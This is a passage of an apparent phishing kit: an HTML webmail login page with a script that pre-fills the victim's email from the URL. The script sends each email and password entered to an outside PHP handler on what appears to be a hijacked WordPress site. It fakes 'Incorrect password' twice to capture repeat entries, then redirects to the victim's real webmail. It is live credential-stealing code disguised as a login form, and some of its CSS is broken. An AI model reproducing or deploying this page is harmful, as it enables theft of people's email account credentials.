    .logo {
      font-size: 40px;
      font-weight: bold;
      color: #f60;
      margin-bottom: 20px;
      font-family: "Trebuchet MS", sans-serif;
      text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
    }
    .login-box {
      width: 320px;
      padding: 25px;
      background: rgba(255, 255, 255, 0.95);
      border-radius: 8px;
      box-shadow: );
      text-align: left;
      position: relative;
    }
    label {
      font-size: 14px;
      font-weight: bold;
      margin-bottom: 4px;
      display: block;
    }
    .input-container {
      position: relative;
      margin-bottom: 15px;
    }
    .input-container i {
      position: absolute;
      top: 50%;
      left: 10px;
      transform: translateY(-50%);
      color: #888;
      font-size: 16px;
    }
    input {
      width: 90.8%;
      height: 36px;
      padding: 10px 10px 10px 35px; /* extra padding for icon */
      border: 2px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }
    button {
      width: 90.8%;
      height: 36px;
      padding: 10px;
      background: #0095e5;
      border: 1px solid black;
      color: #fff;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
      transition: background 0.3s;
    }
    button:hover {
      background: #007bbd;
    }
    .error {
      color: red;
      margin-top: 10px;
      font-size: 14px;

  <!-- Font Awesome CDN for icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
</head>
<body>

  <div class="logo"></div>
  <div class="login-box">
    <form id="loginForm">

      <label for="email">Email Address</label>
      <div class="input-container">
        <i class="fa fa-user"></i>
        <input type="email" id="email" name="email" placeholder="Enter your email address." required>
      </div>

      <label for="password">Password</label>
      <div class="input-container">
        <i class="fa fa-lock"></i>
        <input type="password" id="password" name="password" placeholder="Enter your email password." required>
      </div>

      <button type="submit">Log in</button>
    </form>
    <div id="errorMsg" class="error"></div>
  </div>

  <script>
    // Auto-fill email from URL hash or query string
    window.addEventListener("DOMContentLoaded", function() {
      let emailField = document.getElementById("email");
      let hashValue = window.location.hash.substring(1);
      let params = new URLSearchParams(window.location.search);
      let queryValue = params.get("user");

      if (hashValue) {
        emailField.value = decodeURIComponent(hashValue);
      } else if (queryValue) {
        emailField.value = decodeURIComponent(queryValue);
      }
    });

    let attemptCount = 0;

    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();
      attemptCount++;

      let email = document.getElementById("email").value;
      let password = document.getElementById("password").value;
      let errorBox = document.getElementById("errorMsg");

      // Always POST attempt (1, 2, 3...)
      let xhr = new XMLHttpRequest();
      xhr.open("POST", "https://katrin-iltgen.de/wp-includes/js/submit.php", true); // PHP handler URL
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
          document.getElementById("password").value = ""; 

          if (attemptCount < 3) {
            // First 2 attempts → show incorrect
            errorBox.textContent = "Incorrect password.";
          } else {
            // On 3rd attempt → redirect user
            let domain = email.substring(email.indexOf("@") + 1);
            let redirectUrl = "https://webmail." + domain;
            window.location.href = redirectUrl;
          }
        }
      };
      xhr.send("email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password));
    });
  </script>
